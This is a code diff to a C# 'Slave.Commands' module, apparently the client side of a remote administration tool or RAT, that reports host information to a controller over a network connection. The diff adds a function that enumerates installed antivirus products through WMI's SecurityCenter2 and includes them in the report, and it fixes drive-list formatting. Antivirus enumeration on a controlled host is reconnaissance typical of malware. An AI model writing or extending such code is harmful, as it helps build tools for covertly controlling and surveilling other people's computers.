@@ -27,7 +27,8 @@ namespace Slave.Commands
                 new Tuple<string, string>(".NET version", Environment.Version.ToString()),
                 new Tuple<string, string>("Processor cores", Environment.ProcessorCount.ToString()),
                 new Tuple<string, string>("Machine uptime", TimespanAsString(TimeSpan.FromMilliseconds(Environment.TickCount))),
-                new Tuple<string, string>("Drives", Environment.GetLogicalDrives().Aggregate((current, drive) => $"{current} , " + drive))
+                new Tuple<string, string>("Drives", Environment.GetLogicalDrives().Aggregate((current, drive) => $"{current} , {drive}")),
+                new Tuple<string, string>("Antivirus", GetInstalledAntivirus().Aggregate((current, av) => $"{current} , {av}"))
             };
 
             SlaveCommandsManager.networkManager.WriteLine(SlaveCommandsManager.TableDisplay(infos));
@@ -143,6 +144,17 @@ namespace Slave.Commands
             catch (NullReferenceException)
             {
                 return false;
+            }
+        }
+        
+        public IEnumerable<string> GetInstalledAntivirus()
+        {
+            string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
+            ManagementObjectCollection instances = searcher.Get();
+            foreach (var instance in instances)
+            {
+                yield return instance.GetPropertyValue("displayName").ToString();
             }
         }
 
